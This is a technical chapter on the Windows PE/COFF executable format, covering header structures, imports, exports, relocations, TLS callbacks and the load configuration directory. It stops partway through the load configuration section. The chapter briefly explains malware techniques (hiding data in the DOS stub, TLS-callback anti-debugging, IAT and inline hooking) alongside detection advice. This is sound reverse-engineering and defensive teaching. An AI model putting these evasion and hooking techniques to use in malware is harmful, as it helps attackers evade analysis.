# Domain 1, Chapter 2 — PE/COFF: The Windows Binary Format

> **Scope.** The full PE32+ on-disk and in-memory anatomy: DOS stub, PE signature, COFF file header, optional header (standard and Windows-specific fields, all sixteen data directories), section table, imports (IAT/ILT/hint-name table, bound imports), exports and forwarders, delay-load imports, base relocations, TLS directory and TLS callbacks, the load configuration directory (`__security_cookie`, SafeSEH, Control Flow Guard, eXtended Flow Guard, CET-related fields), table-based exception handling (`.pdata`/`RUNTIME_FUNCTION` on x64 and ARM64), debug directory and CodeView/PDB references, the resource tree, the Authenticode certificate table, the CLR header for managed assemblies, and AppContainer/UWP package identity.
>
> **Audience.** Same as Chapter 1A. This chapter is the Windows counterpart to the ELF chapter and assumes you have read it — comparisons are made throughout, since the same problems (loading, relocation, symbol resolution, exception handling, hardening signaling) recur with different solutions.
>
> **Authoritative sources cross-referenced throughout.** Microsoft's "PE Format" specification (the public version on learn.microsoft.com), the `winnt.h` header (definitive for structure layouts), the `ImageHlp` and `DbgHelp` SDKs, the .NET ECMA-335 standard, the Authenticode PE specification (`Authenticode_PE.docx`, the public reference), and the Wine sources (instructive for loader semantics).

---

## 1. PE/COFF lineage and the lay of the land

PE — Portable Executable — is a Microsoft format derived from COFF (Common Object File Format), which itself came to Windows from VAX/VMS via Microsoft's mid-1990s NT effort. The lineage shows: a PE file on disk begins with a small DOS-era stub for backward "this program cannot be run in DOS mode" politeness, then carries a chain of headers (COFF file header → optional header → section headers → directories pointed to from the optional header) that the Windows loader walks.

Two structural differences from ELF set the tone for everything else.

**RVAs everywhere.** Where ELF program headers carry virtual addresses (absolute for `ET_EXEC`, base-relative for PIE), PE structures carry RVAs — Relative Virtual Addresses, offsets from `ImageBase`. The image is conceptually mapped at `ImageBase` and every internal pointer is `ImageBase + RVA`. When ASLR relocates the image, every absolute pointer in the image must be patched (`.reloc`). RVAs themselves are unchanged.

**One view of the file.** ELF's program-header/section-header duality has no PE equivalent. PE has section headers and that is it. The loader and the linker read the same descriptors. There is no analogue of "section headers stripped, segments retained" — strip the section table from a PE and it does not load.

The on-disk to in-memory mapping is governed by two alignment values in the optional header: `FileAlignment` (typically 0x200 — disk sector size) and `SectionAlignment` (typically 0x1000 — page size). Each section has both `PointerToRawData`/`SizeOfRawData` (file) and `VirtualAddress`/`VirtualSize` (memory). The loader maps each section from its file offset to its RVA, padding with zeros if `VirtualSize > SizeOfRawData` (the analogue of `.bss`).

A header-chain orientation, top to bottom: `IMAGE_DOS_HEADER` (offset 0) → `IMAGE_NT_HEADERS64` at `e_lfanew` → `IMAGE_FILE_HEADER` (the COFF header, immediately after the `"PE\0\0"` signature) → `IMAGE_OPTIONAL_HEADER64` (immediately after) → `IMAGE_SECTION_HEADER[]` (immediately after the optional header) → section bodies and directory contents at their respective file offsets.

---

## 2. The DOS stub and PE signature

`IMAGE_DOS_HEADER` is 64 bytes. The interesting fields:

```c
typedef struct _IMAGE_DOS_HEADER {
    WORD e_magic;     /* 0x5A4D = 'MZ' */
    WORD e_cblp;      /* bytes on last page */
    WORD e_cp;        /* pages in file */
    /* ... fields meaningful only to MS-DOS ... */
    WORD e_res[4];
    WORD e_oemid;
    WORD e_oeminfo;
    WORD e_res2[10];
    LONG e_lfanew;    /* offset of PE header */
} IMAGE_DOS_HEADER;
```

`e_magic == 0x5A4D` (`'MZ'`, after Mark Zbikowski) is the file-type magic. `e_lfanew` at offset 0x3C is the only field the modern loader reads — it points to the `"PE\0\0"` signature. Everything between byte 64 and the PE signature is the DOS stub, conventionally a small 16-bit MZ executable that prints the polite banner and exits.

Three security-relevant points about this region:

The stub is unverified by the loader. Modern Windows ignores it entirely. Malware authors regularly stuff capabilities into the stub region (encrypted blobs, second-stage payload bytes, configuration data) because it is whitespace from the PE loader's perspective and survives most sanitizers. Static analysis that rounds up to "scan everything between the MZ and the PE signature" catches a class of these.

`e_lfanew` is a signed 32-bit integer with no upper bound from the format; it can point arbitrarily into the file. Loaders bounds-check it; static analyzers should too.

The `e_res` and `e_res2` reserved fields are commonly co-opted for compiler-specific marker bytes and as a "Rich header" — undocumented but well-reverse-engineered metadata Microsoft compilers leave behind, encoding `comp.id` values for each compiler/linker that contributed to the binary. The Rich header is XOR-encoded with a per-file key derived from the cleartext, sits between the DOS stub end and the PE signature, and is a useful provenance fingerprint for malware family clustering.

The PE signature itself is the four bytes `0x50 0x45 0x00 0x00` (`"PE\0\0"`). Immediately after it, no padding, comes the COFF file header.

---

## 3. The COFF file header

```c
typedef struct _IMAGE_FILE_HEADER {
    WORD  Machine;
    WORD  NumberOfSections;
    DWORD TimeDateStamp;
    DWORD PointerToSymbolTable;   /* COFF debug; usually 0 in modern PE */
    DWORD NumberOfSymbols;        /* usually 0 */
    WORD  SizeOfOptionalHeader;
    WORD  Characteristics;
} IMAGE_FILE_HEADER;
```

20 bytes. The interesting fields:

**`Machine`.** Identifies the target architecture. Common values: `IMAGE_FILE_MACHINE_AMD64` (0x8664), `IMAGE_FILE_MACHINE_I386` (0x014C), `IMAGE_FILE_MACHINE_ARM64` (0xAA64), `IMAGE_FILE_MACHINE_ARM64EC` (0xA641 — ARM64 Emulation Compatible, the format used for code that runs natively on ARM64 Windows but is x64-callable). The relatively recent ARM64EC matters because ARM64EC binaries carry both ARM64 native code and x64 thunks in the same image — analyses that assume one architecture per image must be updated.

**`TimeDateStamp`.** Historically a UNIX timestamp of the link time. Modern toolchains with reproducible builds set it to a content-derived hash (and emit an `IMAGE_DEBUG_TYPE_REPRO` debug directory entry to declare so). A timestamp of 0 or a hash-shaped value is normal on reproducibly-built modern binaries; exact-second timestamps near each build are normal on older or non-reproducible builds; timestamps in the future or far in the past are anomalies.

**`PointerToSymbolTable`/`NumberOfSymbols`.** COFF symbol table — almost universally absent in modern PE images. Symbol information is delivered via separate PDB files (referenced from the debug directory, §13).

**`SizeOfOptionalHeader`.** Size of the optional header, which immediately follows. 240 for PE32+, 224 for PE32, 0 for object files.

**`Characteristics`.** A bitfield of file-level flags. The notable ones:

- `IMAGE_FILE_EXECUTABLE_IMAGE` (0x0002) — set for valid executable images.
- `IMAGE_FILE_LARGE_ADDRESS_AWARE` (0x0020) — the executable can handle addresses larger than 2 GB; required for any 64-bit binary and for 32-bit binaries that want the 4 GB user-mode address space on 64-bit Windows.
- `IMAGE_FILE_DLL` (0x2000) — this is a DLL, not an EXE.
- `IMAGE_FILE_RELOCS_STRIPPED` (0x0001) — base relocation information stripped; the image must load at `ImageBase` or fail. Incompatible with ASLR. A 64-bit binary with this set is a deliberate choice and excludes itself from ASLR.

---

## 4. The optional header

The "optional" name is historical — for executable images it is mandatory. PE32+ uses `IMAGE_OPTIONAL_HEADER64` (240 bytes plus the data directory array):

```c
typedef struct _IMAGE_OPTIONAL_HEADER64 {
    WORD     Magic;                       /* 0x20B for PE32+; 0x10B for PE32 */
    BYTE     MajorLinkerVersion;
    BYTE     MinorLinkerVersion;
    DWORD    SizeOfCode;
    DWORD    SizeOfInitializedData;
    DWORD    SizeOfUninitializedData;
    DWORD    AddressOfEntryPoint;         /* RVA */
    DWORD    BaseOfCode;                  /* RVA */
    /* PE32 has BaseOfData here; PE32+ does not */
    ULONGLONG ImageBase;                  /* preferred load address */
    DWORD    SectionAlignment;            /* in memory; usually 0x1000 */
    DWORD    FileAlignment;               /* on disk; usually 0x200 */
    WORD     MajorOperatingSystemVersion;
    WORD     MinorOperatingSystemVersion;
    WORD     MajorImageVersion;
    WORD     MinorImageVersion;
    WORD     MajorSubsystemVersion;
    WORD     MinorSubsystemVersion;
    DWORD    Win32VersionValue;           /* must be 0 */
    DWORD    SizeOfImage;                 /* in-memory size, aligned */
    DWORD    SizeOfHeaders;               /* up through last section header */
    DWORD    CheckSum;
    WORD     Subsystem;
    WORD     DllCharacteristics;
    ULONGLONG SizeOfStackReserve;
    ULONGLONG SizeOfStackCommit;
    ULONGLONG SizeOfHeapReserve;
    ULONGLONG SizeOfHeapCommit;
    DWORD    LoaderFlags;                 /* obsolete, must be 0 */
    DWORD    NumberOfRvaAndSizes;         /* almost always 16 */
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64;
```

Most fields are mechanical. The security-interesting ones:

**`Magic`.** 0x20B distinguishes PE32+ (64-bit) from PE32 (0x10B, 32-bit). The two formats differ slightly in field widths beyond `Magic`; tooling that supports both must dispatch on this byte.

**`AddressOfEntryPoint`.** RVA of the first instruction. For an EXE, this is `_start` or similar; for a DLL, it is `DllMain`. Zero is legal: EXEs with `EntryPoint == 0` exist (some packers; some intentional "no entry" stubs); DLLs with `EntryPoint == 0` mean "no DllMain" and are normal. For .NET assemblies, `AddressOfEntryPoint` historically pointed at a tiny native stub that jumped into `mscoree.dll!_CorExeMain`/`_CorDllMain`, but since Windows 8 the loader recognizes the COR header (§16) and calls the CLR directly, leaving `AddressOfEntryPoint` either at zero or at the legacy stub for compatibility.

**`ImageBase`.** Preferred load address. On x64 EXEs, the linker default is 0x140000000; on DLLs, 0x180000000. With ASLR (`IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE`), this is just a hint — the loader picks an actual base and applies `.reloc` to fix up absolute references.

**`Subsystem`.** Tells the loader (and `wininit`) what runtime environment to provide. `IMAGE_SUBSYSTEM_NATIVE` (1) is for kernel drivers and a few user-mode tools (`smss.exe`); `IMAGE_SUBSYSTEM_WINDOWS_GUI` (2) and `IMAGE_SUBSYSTEM_WINDOWS_CUI` (3) are the normal user-mode values; `IMAGE_SUBSYSTEM_EFI_*` (10–13) are for UEFI binaries. A user-mode binary with `Subsystem == NATIVE` is highly anomalous; UEFI binaries appearing in a Windows-userland file system likewise.

**`DllCharacteristics`.** The Windows hardening bitmap. Each bit signals participation in a mitigation:

- `IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA` (0x0020) — image can be relocated to a high-entropy 64-bit address (full 64-bit ASLR rather than the narrower 32-bit randomization).
- `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` (0x0040) — image is ASLR-eligible. Without this, the loader honors `ImageBase` exactly.
- `IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY` (0x0080) — the image must be code-signed (Authenticode or catalog) for the kernel to load it. Used by drivers and protected processes.
- `IMAGE_DLLCHARACTERISTICS_NX_COMPAT` (0x0100) — the image is compatible with Data Execution Prevention; non-code pages can be marked NX.
- `IMAGE_DLLCHARACTERISTICS_NO_ISOLATION` (0x0200) — the image is not isolation-aware (side-by-side / activation context).
- `IMAGE_DLLCHARACTERISTICS_NO_SEH` (0x0400) — the image declares no SEH handlers; the loader can refuse to dispatch SEH into it. Tightens SafeSEH on x86.
- `IMAGE_DLLCHARACTERISTICS_NO_BIND` (0x0800) — bind tools should not pre-resolve imports against this image.
- `IMAGE_DLLCHARACTERISTICS_APPCONTAINER` (0x1000) — image is meant to run in an AppContainer (UWP and similar).
- `IMAGE_DLLCHARACTERISTICS_GUARD_CF` (0x4000) — Control Flow Guard is enabled; the load configuration directory's CFG fields are populated (§11).
- `IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE` (0x8000) — image runs correctly in a Terminal Server / RDP session.

A hardening posture report on a Windows binary inspects this byte and the load configuration directory in tandem. The matrix `{DEP, ASLR (and HIGH_ENTROPY_VA), CFG, SafeSEH if x86, signed, AppContainer-aware}` is what a reviewer cares about.

**`SizeOfStackReserve`/`Commit`** and **`SizeOfHeapReserve`/`Commit`.** Default thread stack size and the initial commit. Inflated values are sometimes used by malware to avoid stack-overflow probing during long unpacking routines; deflated values force more frequent guard-page faults, occasionally a sandbox-evasion trick.

**`NumberOfRvaAndSizes`.** Almost always 16. The spec allows fewer or more, but the loader assumes 16. Anomalies here can be a packer artifact.

### 4.1 The sixteen data directories

The data directory array is the linchpin: each `IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; }` points to one of the named directories. The canonical sixteen, by index:

| Idx | Name                      | What it points at                                          |
|----:|---------------------------|------------------------------------------------------------|
| 0   | Export                    | `IMAGE_EXPORT_DIRECTORY` (§7)                              |
| 1   | Import                    | `IMAGE_IMPORT_DESCRIPTOR[]` (§6)                           |
| 2   | Resource                  | Root `IMAGE_RESOURCE_DIRECTORY` (§14)                      |
| 3   | Exception                 | `RUNTIME_FUNCTION[]` (§12)                                 |
| 4   | Certificate               | `WIN_CERTIFICATE[]` — file offset, not RVA (§15)           |
| 5   | Base Relocation           | Block-structured `.reloc` (§9)                             |
| 6   | Debug                     | `IMAGE_DEBUG_DIRECTORY[]` (§13)                            |
| 7   | Architecture              | Reserved (zero on x86/x64; was used on Alpha)              |
| 8   | Global Ptr                | RVA only; for IA-64 GP register; zero on x86/x64           |
| 9   | TLS                       | `IMAGE_TLS_DIRECTORY` (§10)                                |
| 10  | Load Config               | `IMAGE_LOAD_CONFIG_DIRECTORY` (§11)                        |
| 11  | Bound Import              | Pre-resolved import descriptors (§6.4)                     |
| 12  | IAT                       | Import Address Table (the IAT proper; see §6)              |
| 13  | Delay Import              | `IMAGE_DELAYLOAD_DESCRIPTOR[]` (§8)                        |
| 14  | CLR Runtime Header        | `IMAGE_COR20_HEADER` (§16)                                 |
| 15  | Reserved                  | Must be zero                                               |

Note that the Certificate directory is the only one that uses a file offset rather than an RVA, because it lives outside the image's mapped memory range — Authenticode signature data is not loaded into memory by the PE loader; it is read by `WinVerifyTrust` and friends out of the file directly.

---

## 5. Section tables

Immediately after the optional header sits an array of `IMAGE_SECTION_HEADER` (40 bytes each), one per section:

```c
typedef struct _IMAGE_SECTION_HEADER {
    BYTE  Name[8];                         /* not necessarily NUL-terminated */
    union {
        DWORD PhysicalAddress;
        DWORD VirtualSize;                 /* size in memory */
    } Misc;
    DWORD VirtualAddress;                  /* RVA of section start */
    DWORD SizeOfRawData;                   /* size on disk, FileAlignment-rounded */
    DWORD PointerToRawData;                /* file offset */
    DWORD PointerToRelocations;            /* COFF only; 0 in image */
    DWORD PointerToLinenumbers;            /* COFF only; 0 in image */
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER;
```

Section names are conventional (`.text`, `.rdata`, `.data`, `.bss`, `.rsrc`, `.reloc`, `.pdata`, `.tls`, `.idata`, `.edata`, `.didat` for delay imports, `.gfids` for CFG function IDs, etc.) but not load-bearing. The loader uses the section table to map regions and then refers to data via the directory RVAs in the optional header.

Two on-disk vs in-memory subtleties:

`SizeOfRawData` is rounded up to `FileAlignment`; `VirtualSize` is the actual logical size (not rounded). For BSS-like sections, `SizeOfRawData` may be 0 with `VirtualSize > 0` — the loader allocates and zeros the region. Conversely, `SizeOfRawData > VirtualSize` means the file has padding the loader truncates.

If `VirtualSize > SizeOfRawData`, the trailing bytes in the mapped section are zero-initialized. Tools that scan only `SizeOfRawData` worth of bytes from disk miss BSS-like content altogether.

**`Characteristics`.** The section permission and content bitmap. Notable bits:

- `IMAGE_SCN_CNT_CODE` (0x00000020), `IMAGE_SCN_CNT_INITIALIZED_DATA` (0x00000040), `IMAGE_SCN_CNT_UNINITIALIZED_DATA` (0x00000080) — content kind.
- `IMAGE_SCN_MEM_DISCARDABLE` (0x02000000) — section can be discarded after load (e.g., `.reloc` after relocation).
- `IMAGE_SCN_MEM_NOT_CACHED` (0x04000000), `IMAGE_SCN_MEM_NOT_PAGED` (0x08000000), `IMAGE_SCN_MEM_SHARED` (0x10000000) — caching/paging hints (the latter creates a page that is shared between processes loading the DLL, instead of the normal copy-on-write; rare in user mode, used in some legacy DLLs to share state across processes — and historically a soft-IPC vector).
- `IMAGE_SCN_MEM_EXECUTE` (0x20000000), `IMAGE_SCN_MEM_READ` (0x40000000), `IMAGE_SCN_MEM_WRITE` (0x80000000) — runtime page permissions.
- `IMAGE_SCN_ALIGN_*BYTES` — only meaningful in object files.

A section that is both `MEM_EXECUTE` and `MEM_WRITE` is the W^X violation marker on Windows; flag it in any static analysis. JIT engines allocate W+X dynamically rather than declaring such a section in the image. The legitimate exception is some old assembly hand-written for the pre-DEP era, which a modern toolchain will still warn about.

---

## 6. Imports

PE's import mechanism is the analogue of ELF's `DT_NEEDED` / `.rela.plt` / GOT pair. It is laid out across several parallel tables.

### 6.1 The import directory

A null-terminated array of `IMAGE_IMPORT_DESCRIPTOR`, one per imported DLL:

```c
typedef struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD Characteristics;          /* obsolete */
        DWORD OriginalFirstThunk;       /* RVA to ILT (Import Lookup Table) */
    };
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;                         /* RVA to NUL-terminated DLL name */
    DWORD FirstThunk;                   /* RVA to IAT */
} IMAGE_IMPORT_DESCRIPTOR;
```

For each imported DLL: `Name` gives the DLL filename (e.g., `"kernel32.dll"`); `OriginalFirstThunk` (the **ILT**, Import Lookup Table) and `FirstThunk` (the **IAT**, Import Address Table) point at parallel arrays of thunks describing each imported symbol.

### 6.2 ILT and IAT

Each thunk is an `IMAGE_THUNK_DATA64` (8 bytes on 64-bit) interpreted as either an ordinal or a name reference based on its top bit:

If `IMAGE_ORDINAL_FLAG64` (bit 63) is set, the low 16 bits are an ordinal — the function's index in the target DLL's export table.

If bit 63 is clear, the value is an RVA to an `IMAGE_IMPORT_BY_NAME { WORD Hint; CHAR Name[]; }` structure. `Hint` is a guess at the function's index in the target DLL's export name array; if the hint is correct, the loader can skip the binary search. `Name` is the NUL-terminated function name.

Both arrays are NULL-terminated (a thunk of value zero ends the list).

The ILT is the original, never modified at runtime. The IAT begins as a copy of the ILT (so the loader knows what to resolve), and the loader writes resolved function addresses into the IAT during load. After resolution, code calling an imported function does so through `call qword ptr [iat_slot_rva]` — the IAT is the indirect-call table.

A binary stripped of its ILT (some packers do this — `OriginalFirstThunk` set to zero) leaves the loader resolving against the IAT in place, which works at load time but loses the canonical record of imports for tooling. A defender's static-analysis tool should consult the ILT first, fall back to the IAT, and flag the no-ILT case as a packer signal.

### 6.3 Forwarded imports

When the loader resolves a name, it may discover that the target DLL's export entry is a forwarder (§7). In that case, the loader follows the forwarder string to a different DLL and resolves there. This is invisible at the import-table level — the IAT slot ends up pointing at a function in a DLL not named in the import directory.

### 6.4 Bound imports

When a DLL's exports and load address are stable, the linker can pre-resolve the IAT at bind time, a concept similar to ELF prelinking. The bound-import directory (data directory 11) contains `IMAGE_BOUND_IMPORT_DESCRIPTOR` entries — DLL name, timestamp, and forwarder chain — and the IAT in the image is filled with absolute addresses computed for the expected `ImageBase` of each DLL.

At load, if the actual loaded DLL matches the expected timestamp and base, the loader uses the bound IAT directly and skips resolution. If anything mismatches, the loader walks the ILT and resolves normally.

ASLR mostly defeated bound imports in modern Windows: with random DLL bases, the bound addresses are wrong every load, and the loader has to re-resolve. Bound import directories are rare in modern binaries, but present in some legacy DLLs and a few system binaries built for stable bases.

### 6.5 Detection and forensic notes

The IAT is the corresponding object to ELF's GOT — and the corresponding tampering target. Detection patterns:

IAT hooking by injecting code that walks an image's import directory, allocates a memory region, copies an import to a stub that does pre/post work and then jumps to the original, and overwrites the IAT slot with the stub address. Detection: compare in-memory IAT entries against the addresses you would compute by resolving each import freshly. A rich-process EDR maintains an internal model of every loaded DLL's exports and validates IAT against it.

Inline hooking of imported functions doesn't touch the IAT at all — instead it writes a jmp at the start of the target function (or steals 5–14 bytes for a trampoline) inside the target DLL. Detection: compare the first dozen or so bytes of every imported function against known-good. EDRs do this constantly.

DLL ordinal-only imports (`IMAGE_ORDINAL_FLAG64` set) are common but obfuscation-friendly: an analyst sees `kernel32!#65` rather than `kernel32!CreateFileA`. Tools should resolve ordinals against the target DLL's export table during analysis to recover names.

---

## 7. Exports and forwarders

The `IMAGE_EXPORT_DIRECTORY`:

```c
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion, MinorVersion;
    DWORD Name;                    /* RVA of DLL name string */
    DWORD Base;                    /* ordinal base */
    DWORD NumberOfFunctions;       /* count in EAT */
    DWORD NumberOfNames;           /* count in name and ordinal arrays */
    DWORD AddressOfFunctions;      /* RVA of EAT */
    DWORD AddressOfNames;          /* RVA of name table */
    DWORD AddressOfNameOrdinals;   /* RVA of ordinal table */
} IMAGE_EXPORT_DIRECTORY;
```

The export tables are three parallel structures:

The **EAT** (Export Address Table) at `AddressOfFunctions` is an array of `NumberOfFunctions` RVAs. The function at ordinal `N` is at EAT index `N - Base`.

The **name table** at `AddressOfNames` is an array of `NumberOfNames` RVAs to NUL-terminated function names. Sorted lexically (so the loader can binary-search by name).

The **ordinal table** at `AddressOfNameOrdinals` is a parallel `NumberOfNames`-element array of WORDs. `nameOrdinals[i]` is the EAT index for the function whose name is at `names[i]`.

Resolution by name: binary-search the name table for the requested name; on hit, take the parallel `nameOrdinals` entry as an EAT index; look up `EAT[ordinal]` to get the function RVA.

Resolution by ordinal: skip the name search; index the EAT directly with `ordinal - Base`.

Not every export has a name. Functions can be exported by ordinal only, in which case they appear in the EAT but not in the name/ordinal tables. Such exports are common in undocumented Windows internals (e.g., `ntdll.dll` exports many ordinal-only routines).

### 7.1 Forwarded exports

If an EAT entry's RVA points within the export directory itself (between the directory's start and start+size), the bytes at that address are interpreted not as a function but as a NUL-terminated string of the form `"OtherDll.OtherFunction"` or `"OtherDll.#OrdinalNumber"`. The loader follows the forwarder: when something tries to call this exported function, the loader resolves it to the named function in the named DLL.

Forwarders are the Windows mechanism for API compatibility and reorganization. `kernel32!HeapAlloc` forwards to `ntdll!RtlAllocateHeap` on modern Windows; the API set DLLs (`api-ms-win-core-heap-l1-2-0.dll`) are forwarder-only DLLs that exist solely to redirect to the actual implementation in `kernelbase.dll` or `ntdll.dll`. The API set mechanism allows the OS to relocate function implementations between system DLLs without breaking binaries that import from the public-facing names.

Detection note: an export forwarder is a string that lives in the export directory's mapped region. Hijack scenarios involving forwarders typically require write access to a system DLL on disk, which is significant by itself.

---

## 8. Delay-load imports

Delay-load is the Windows analogue of ELF lazy binding: a function is not bound until first call, with the difference that the lazy resolution is implemented in user code (a runtime helper), not in the loader. The directory:

```c
typedef struct _IMAGE_DELAYLOAD_DESCRIPTOR {
    union {
        DWORD AllAttributes;
        struct {
            DWORD RvaBased : 1;
            DWORD ReservedAttributes : 31;
        } DUMMYSTRUCTNAME;
    } Attributes;
    DWORD DllNameRVA;
    DWORD ModuleHandleRVA;
    DWORD ImportAddressTableRVA;     /* IAT-equivalent; this is what code calls through */
    DWORD ImportNameTableRVA;        /* ILT-equivalent */
    DWORD BoundImportAddressTableRVA;
    DWORD UnloadInformationTableRVA;
    DWORD TimeDateStamp;
} IMAGE_DELAYLOAD_DESCRIPTOR;
```

On first call to a delay-loaded function, the IAT slot points not at the resolved function but at a thunk that calls `__delayLoadHelper2` (linked into the binary by the linker). The helper:

1. Locates the descriptor for the target DLL.
2. Calls `LoadLibraryEx` to load the DLL (this is the deferred work — the DLL was not loaded at process startup).
3. Calls `GetProcAddress` for each function in the descriptor's name table (or the specific function being called, depending on the helper version and flags).
4. Patches the corresponding IAT slot with the resolved address.
5. Tail-calls the resolved function.

Subsequent calls go through the now-patched IAT slot directly to the function.

This is identical in spirit to ELF lazy binding via PLT, but the resolver is in the application's address space (linked from `delayimp.lib`) rather than in the loader. Application code can hook delay-load notifications (`__pfnDliNotifyHook2`, `__pfnDliFailureHook2`) to implement custom handling — for example, translating a delay-load failure into a fallback path.

Security-relevant points:

The IAT for a delay-load is writable until the function is bound (otherwise the helper couldn't patch it). This is the Windows analogue of the partial-RELRO problem with `.got.plt`. There is no full-RELRO equivalent: delay-load IATs are unprotected by design.

A binary can be analyzed for what DLLs it might load by walking the delay-load descriptor table. If the directory shows a delay-load descriptor for an exotic DLL (`mscoree.dll`, `dbghelp.dll`, `wininet.dll`) that the binary's stated purpose doesn't justify, it's a useful indicator.

---

## 9. Base relocations

The `.reloc` section, pointed to by data directory 5, is structured as a sequence of variable-length blocks, each fixing up one 4 KB page of the image:

```c
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD VirtualAddress;       /* RVA of the page being fixed */
    DWORD SizeOfBlock;          /* total size of this block in bytes, including header */
    /* WORD TypeOffset[]; follows; (SizeOfBlock - 8) / 2 entries */
} IMAGE_BASE_RELOCATION;
```

Each `WORD` entry has a 4-bit type in the high nibble and a 12-bit offset in the low 12 bits (the offset from `VirtualAddress` to the bytes being patched).

Types on x86_64:

- `IMAGE_REL_BASED_ABSOLUTE` (0) — padding entry, no fix-up. Exists to keep blocks aligned to 4-byte boundaries.
- `IMAGE_REL_BASED_HIGHLOW` (3) — 32-bit absolute fix-up; used on x86. Add `(actualBase - ImageBase)` to the 32-bit value at the target.
- `IMAGE_REL_BASED_DIR64` (10) — 64-bit absolute fix-up; used on x64. Add the same delta to a 64-bit value.

Other types (`HIGH`, `LOW`, `HIGHADJ`) are used on architectures with split-immediate addressing modes; ARM64 uses additional types for its `ADRP`/`ADD` pairs (`IMAGE_REL_BASED_ARM64_BRANCH26`, etc.) defined in `winnt.h`.

A binary with a populated `.reloc` and `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` set is ASLR-eligible. A 64-bit binary with `.reloc` stripped (`IMAGE_FILE_RELOCS_STRIPPED` in `Characteristics`) cannot be relocated and must load at `ImageBase`; if that conflicts with another image, load fails.

A subtle point: if `DYNAMIC_BASE` is set but `.reloc` is empty or missing, ASLR is effectively disabled despite the flag, because there is nothing to relocate. Compliance scanning that checks only `DllCharacteristics` misses this; a thorough check verifies both the bit and the `.reloc` directory.

---

## 10. The TLS directory and TLS callbacks

```c
typedef struct _IMAGE_TLS_DIRECTORY64 {
    ULONGLONG StartAddressOfRawData;     /* VA of TLS template start */
    ULONGLONG EndAddressOfRawData;       /* VA of TLS template end */
    ULONGLONG AddressOfIndex;            /* VA where loader writes TLS slot index */
    ULONGLONG AddressOfCallBacks;        /* VA of NULL-terminated callback array */
    DWORD     SizeOfZeroFill;
    DWORD     Characteristics;
} IMAGE_TLS_DIRECTORY64;
```

The TLS template (`StartAddressOfRawData` to `EndAddressOfRawData` plus `SizeOfZeroFill`) is the initial image of per-thread TLS data, copied for each thread that reaches code referencing TLS. Note that these are VAs (absolute addresses, after relocation), not RVAs.

`AddressOfCallBacks` is the security-interesting field. It points at a NULL-terminated array of `PIMAGE_TLS_CALLBACK` function pointers:

```c
typedef VOID (NTAPI *PIMAGE_TLS_CALLBACK)(
    PVOID DllHandle, DWORD Reason, PVOID Reserved);
```

The loader invokes every callback in the array, in order, on four occasions: process attach (`DLL_PROCESS_ATTACH`), thread attach (`DLL_THREAD_ATTACH`), thread detach (`DLL_THREAD_DETACH`), process detach (`DLL_PROCESS_DETACH`).

Critically, **TLS callbacks run before the EXE's `AddressOfEntryPoint`** on `DLL_PROCESS_ATTACH`. They run in the loader's context, with the import table fully resolved, before any user-visible startup. This makes TLS callbacks a classic and still-effective:

- Persistence and stealth mechanism for malware. An EXE with a TLS callback can perform anti-analysis checks (debugger present, sandbox indicators, etc.) before any breakpoint set on the entry point would fire. Reverse engineers who set breakpoints only on `EntryPoint` miss TLS-callback execution entirely.
- Anti-debug technique. The TLS callback can detect attached debuggers (via `IsDebuggerPresent`, `NtQueryInformationProcess` with `ProcessDebugPort`, the PEB `BeingDebugged` flag) and either crash the process, exit cleanly, or branch to decoy logic.
- DLL injection trigger. If a malicious DLL is loaded into a target process, its TLS callbacks fire during `LoadLibrary` before any custom initialization the injector requested.

Detection: every binary with a non-zero `AddressOfCallBacks` and a non-empty callback array deserves attention, and the bytes at the callback addresses should be disassembled regardless of where `EntryPoint` points. Modern toolchains rarely emit TLS callbacks (C++ static initializers do not need them — those run later via the CRT); their presence on an unsigned EXE is suggestive.

---

## 11. The load configuration directory

The load configuration directory is the umbrella for several runtime-mitigation tables: stack canaries, SafeSEH, Control Flow Guard, eXtended Flow Guard, retpoline metadata, CET shadow-stack policy, and others. The structure has grown across Windows versions; current `IMAGE_LOAD_CONFIG_DIRECTORY64` runs to several hundred bytes. The fields most often interrogated:

**`SecurityCookie`.** VA of the global `__security_cookie` variable. The MSVC `/GS` stack-cookie protection initializes this cookie at process startup with high-entropy bytes (process ID and time mixed, then tightened further); functions with `/GS` instrumentation push the cookie into their stack frame on entry and verify it on exit, calling `__security_check_cookie` → `__report_gsfailure` on mismatch. The cookie's location is what attackers need to read (or predict) to forge a stack canary; its randomness depends on the initialization quality, which has improved repeatedly over the years.

**`SEHandlerTable` / `SEHandlerCount`** (x86 only). SafeSEH metadata: a list of RVAs of every legitimate SEH handler in the image. The exception dispatcher checks any candidate SEH handler against this list (or, alternatively, checks SafeSEH-aware module load order) before dispatching. On x64 and ARM64, structured exception handling is table-driven (§12) and SafeSEH is irrelevant.

**`GuardCFCheckFunctionPointer`.** VA of `__guard_check_icall_fptr` — the CFG check function. The compiler emits, before every indirect call, a call to this function to validate the target. The function checks the target against the CFG bitmap.

**`GuardCFDispatchFunctionPointer`.** Newer; for combined check-and-dispatch.

**`GuardCFFunctionTable` / `GuardCFFunctionCount`.** Table of valid indirect-call targets in the image (RVAs). The loader rasterizes this into a process-wide bitmap; each set bit corresponds to an address that is a legitimate indirect-call target.

**`GuardFlags`.** A bitmap describing what CFG/XFG features are active: `IMAGE_GUARD_CF_INSTRUMENTED`, `IMAGE_GUARD_CFW_INSTRUMENTED` (write check), `IMAGE_GUARD_CF_FUNCTION_TABLE_PRESENT`, `IMAGE_GUARD_CF_LONGJUMP_TABLE_PRESENT`, `IMAGE_GUARD_CF_EXPORT_SUPPRESSION_INFO_PRESENT`, `IMAGE_GUARD_RF_INSTRUMENTED` (Return Flow), and entries for XFG (`IMAGE_GUARD_XFG_*`).

